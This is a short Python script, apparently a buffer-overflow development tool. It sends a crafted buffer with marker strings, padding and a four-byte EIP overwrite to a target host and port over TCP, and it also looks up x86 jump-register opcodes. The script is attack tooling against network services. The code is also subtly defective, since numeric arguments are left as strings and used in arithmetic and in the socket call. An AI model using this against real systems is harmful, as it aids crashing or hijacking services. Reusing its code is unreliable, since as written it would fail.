import socket
import time
import sys

jump = {"eax":"ffe0","ebx":"ffe3","ecx":"ffe1","edx":"ffe2","ebp":"ffe5","esp":"ffe4","esi":"ffe6","edi":"ffe7"}

if len(sys.argv) == 2:
    register = sys.argv[1]
    register = register.lower()
    print jump[register]
    exit(0)

elif len(sys.argv) != 5:
    print("usage: \"python space.py [host] [port] [size] [eip]\"")
    print("usage: \"can also be used to find jump opcodes with \"python space.py [register name]\"")
    exit(0)

host = sys.argv[1]
port = sys.argv[2]
size = sys.argv[3]
eip = sys.argv[4]

herring = "This is before the EIP"
herring2 = "This is after the EIP"

inputBuffer = herring + "A" * (eip - len(herring)) + "B" * 4 + herring2 + "C" * (size - eip - len(herring2))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()
